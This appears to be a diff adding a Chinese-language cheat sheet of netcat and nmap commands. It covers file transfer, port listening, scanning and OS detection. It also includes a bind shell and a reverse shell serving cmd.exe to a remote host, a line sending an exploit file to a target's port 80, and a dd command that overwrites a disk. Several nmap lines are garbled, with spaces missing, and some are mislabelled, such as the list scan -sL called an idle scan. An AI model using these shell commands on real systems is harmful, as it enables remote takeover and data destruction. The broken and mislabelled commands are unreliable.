@@ -1,0 +1,110 @@
+nc
+
+nc
+#nc 传输文件
+nc -l -p 30240 > recev.tar.bz2
+30240是任一个不受防火墙干扰的端口。可以随便该， 范围在1025-65534.发送端发送文件.
+nc  192.168.xxx.xxx 30240 < send.tar.bz2
+
+nc -l 1234 | tar -xzvf -
+tar -czvf - www | nc x.x.x.x 1234
+
+for i in {1..253}; do ping  192.168.1.$i; done
+
+netcat
+nc -l -p port [options] [hostname] [port]
+-d 后台模式
+-e prog 程序重定向，一旦连接，就执行 [危险!!]
+-g gateway source-routing hop point[s], up to 8
+-G num source-routing pointer: 4, 8, 12, ...
+-h 帮助信息
+-i secs 延时的间隔
+-l 监听模式，用于入站连接
+-L 连接关闭后,仍然继续监听
+-n 指定数字的IP地址，不能用hostname
+-o file 记录16进制的传输
+-p port 本地端口号
+-r 随机本地及远程端口
+-s addr 本地源地址
+-t 使用TELNET交互方式
+-u UDP模式
+-v 详细输出--用两个-v可得到更详细的内容
+-w secs timeout的时间
+-z 将输入输出关掉--用于扫描时
+端口的表示方法可写为M-N的范围格式。
+
+nc -nvv 192.168.x.x 80  连接到 80
+nc -l -p 80  监听本机 80
+
+nc -v ip 端口    监控端口信息
+
+Server
+$tar -cvf – dir_name | nc -l 1567
+Client
+ $nc -n 172.31.100.7 1567 | tar -xvf  -
+
+加密发送
+$nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb > file.txt
+$mcrypt –flush –bare -F -q -m ecb < file.txt | nc -l 1567
+
+视频流
+cat video.avi | nc -l 1567
+$nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -
+
+克隆设备
+$dd if=/dev/sda | nc -l 1567
+$nc -n 172.31.100.7 1567 | dd of=/dev/sda
+
+nc -nvv -w2 -z 192.168.x.x 80-445   扫描端口
+
+nc -l -p 5354 -t -e c:\winnt\system32\cmd.exe  绑定程序   可怕的命令
+
+nc -t -e c:\winnt\system32\cmd.exe 192.168.x.x 5354  反射
+
+格式1：type.exe c:\exploit.txt|nc -nvv 192.168.x.x 80
+格式2：nc -nvv 192.168.x.x 80 < c:\exploit.txt
+讲解：连接到192.168.x.x的80端口，并在其管道中发送'c:\exploit.txt'的内容(两种格式确有相同的效果，
+真是有异曲同工之妙:P)
+
+nc -L -p 80  连续监听
+nc -L -p 80 > c:\log.txt
+
+nc -L -p 80 < c:\honeypot.txt
+
+nc -v www.wuranju.com  80< aa.txt >html.txt
+
+
+ echo -e "GET / HTTP/1.0\r\n" | nc www.163.com 80
+
+nmap
+
+
+nmap 192.168.1.1/24
+nmap 192.168.1.2 192.168.1.5
+nmap 192.168.1.1-100
+
+nmap -iL target.txt  #主机列表
+
+nmap -sL 192.168.1.1/24 #排除扫描
+nmap192.168.1.1/24-exclude192.168.1.1  #排除单个
+nmap192.168.1.1/24-excludefilexxx.txt(xxx.txt中的文件将会从扫描的主机中排除)
+
+nmap-p80,21,23  192.168.1.1  #指定端口
+
+nmap -sS 192.168.1.1  #半开扫描
+
+tcp,udp
+nmap -sT 192.168.1.1
+nmap -sU 192.168.1.1
+
+ping
+nmap-sP192.168.1.1
+
+版本检测
+nmap-sV192.168.1.1
+
+Idlescan是一种理想的匿名扫描技术
+nmap-sL 192.168.1.6 192.168.1.1
+
+操作系统检测 绕过ping
+nmap -O -PN 192.168.1.1/24
